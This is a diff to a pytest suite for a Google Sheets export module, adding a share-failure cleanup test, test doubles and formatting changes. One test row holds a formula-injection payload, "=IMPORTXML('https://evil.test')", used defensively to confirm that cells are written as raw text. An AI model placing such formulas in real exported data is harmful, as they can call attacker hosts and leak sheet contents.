@@ -9,6 +9,7 @@ from __future__ import annotations
 from pathlib import Path
 
 import pytest
+from googleapiclient.errors import HttpError
 
 from grant_watch import google_sheets
 
@@ -31,7 +32,8 @@ def test_cell_coerces_none_and_preserves_scalar_types() -> None:
 def test_create_sheet_requires_mapped_rep() -> None:
     """No roster identity fails immediately without touching Google."""
     state, message = google_sheets.create_sheet(
-        "Export", ["entity"], [["District"]], "U_UNKNOWN", "")
+        "Export", ["entity"], [["District"]], "U_UNKNOWN", ""
+    )
     assert state == "error" and "mapped" in message
 
 
@@ -40,7 +42,8 @@ def test_create_sheet_unconfigured_without_env(monkeypatch: pytest.MonkeyPatch) 
     monkeypatch.delenv("GOOGLE_SA_KEY_PATH", raising=False)
     monkeypatch.delenv("GRANT_EXPORTS_DRIVE_ID", raising=False)
     state, message = google_sheets.create_sheet(
-        "Export", ["entity"], [["District"]], REP_SLACK, REP_EMAIL)
+        "Export", ["entity"], [["District"]], REP_SLACK, REP_EMAIL
+    )
     assert state == "unconfigured" and "configured" in message
 
 
@@ -49,6 +52,7 @@ class _FakeCall:
     """A pending Google API call whose result is returned by execute()."""
 
     def __init__(self, result: object) -> None:
+        """Initialize the test double."""
         self._result = result
 
     def execute(self) -> object:
@@ -60,24 +64,52 @@ class _FakeFiles:
     """Records files().create as files.create."""
 
     def __init__(self, log: dict[str, object]) -> None:
+        """Initialize the test double."""
         self._log = log
 
     def create(self, **kwargs: object) -> _FakeCall:
         """Record the file-create call and hand back a fixed spreadsheet id/url."""
         self._log["files.create"] = kwargs
-        return _FakeCall({"id": "SID123",
-                          "webViewLink": "https://docs.google.com/spreadsheets/d/SID123"})
+        return _FakeCall(
+            {
+                "id": "SID123",
+                "webViewLink": "https://docs.google.com/spreadsheets/d/SID123",
+            }
+        )
+
+    def delete(self, **kwargs: object) -> _FakeCall:
+        """Record cleanup of an incomplete/unshared spreadsheet."""
+        self._log["files.delete"] = kwargs
+        return _FakeCall({})
+
+
+class _HttpResponse:
+    """Minimal httplib2-style response carried by googleapiclient HttpError."""
+
+    status = 403
+    reason = "forbidden"
+
+
+class _FailCall:
+    """A Google API call that fails with an HTTP 403 when executed."""
+
+    def execute(self) -> object:
+        """Raise the same exception type the real Google client uses."""
+        raise HttpError(_HttpResponse(), b'{"error":"forbidden"}')
 
 
 class _FakePermissions:
     """Records permissions().create as permissions.create."""
 
     def __init__(self, log: dict[str, object]) -> None:
+        """Initialize the test double."""
         self._log = log
 
-    def create(self, **kwargs: object) -> _FakeCall:
+    def create(self, **kwargs: object) -> _FakeCall | _FailCall:
         """Record the share call."""
         self._log["permissions.create"] = kwargs
+        if self._log.get("fail_share"):
+            return _FailCall()
         return _FakeCall({})
 
 
@@ -85,6 +117,7 @@ class _FakeDrive:
     """Hands out distinct files/permissions helpers backed by a shared log."""
 
     def __init__(self, log: dict[str, object]) -> None:
+        """Initialize the test double."""
         self._log = log
 
     def files(self) -> _FakeFiles:
@@ -100,6 +133,7 @@ class _FakeSheets:
     """Records values().update and batchUpdate into a shared log."""
 
     def __init__(self, log: dict[str, object]) -> None:
+        """Initialize the test double."""
         self._log = log
 
     def spreadsheets(self) -> "_FakeSheets":
@@ -131,7 +165,8 @@ def _wire_fakes(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> dict[str, ob
     log: dict[str, object] = {}
     monkeypatch.setattr(
         "google.oauth2.service_account.Credentials.from_service_account_file",
-        lambda *_a, **_k: object())
+        lambda *_a, **_k: object(),
+    )
 
     def fake_build(service: str, _version: str, **_kwargs: object) -> object:
         """Return the fake matching the requested Google service."""
@@ -142,16 +177,20 @@ def _wire_fakes(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> dict[str, ob
 
 
 def test_create_sheet_writes_all_rows_raw_and_shares_with_rep(
-        monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
     """The export lands in the shared drive, writes every row as literal RAW text,
     shares with the rep, and returns the sheet URL."""
     log = _wire_fakes(monkeypatch, tmp_path)
     columns = ["entity", "amount"]
-    rows: list[list[object]] = [["City of Austin", 120000],
-                                ["=IMPORTXML('https://evil.test')", 1]]
+    rows: list[list[object]] = [
+        ["City of Austin", 120000],
+        ["=IMPORTXML('https://evil.test')", 1],
+    ]
 
     state, url = google_sheets.create_sheet(
-        "Grant search results", columns, rows, REP_SLACK, REP_EMAIL)
+        "Grant search results", columns, rows, REP_SLACK, REP_EMAIL
+    )
 
     assert state == "created"
     assert url == "https://docs.google.com/spreadsheets/d/SID123"
@@ -181,10 +220,27 @@ def test_create_sheet_writes_all_rows_raw_and_shares_with_rep(
 
 
 def test_create_sheet_maps_none_to_empty_cell(
-        monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
     """A NULL database value becomes an empty cell, not the string 'None'."""
     log = _wire_fakes(monkeypatch, tmp_path)
-    google_sheets.create_sheet(
-        "x", ["a", "b"], [["only", None]], REP_SLACK, REP_EMAIL)
+    google_sheets.create_sheet("x", ["a", "b"], [["only", None]], REP_SLACK, REP_EMAIL)
     values = log["values.update"]["body"]["values"]  # type: ignore[index]
     assert values[1] == ["only", ""]
+
+
+def test_share_failure_removes_sheet_and_reports_error(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    """An unshared sheet is deleted and never reported as a successful export."""
+    log = _wire_fakes(monkeypatch, tmp_path)
+    log["fail_share"] = True
+    state, message = google_sheets.create_sheet(
+        "x", ["entity"], [["District"]], REP_SLACK, REP_EMAIL
+    )
+    assert state == "error"
+    assert "could not be shared" in message
+    delete_kwargs = log["files.delete"]
+    assert isinstance(delete_kwargs, dict)
+    assert delete_kwargs["fileId"] == "SID123"
+    assert delete_kwargs["supportsAllDrives"] is True
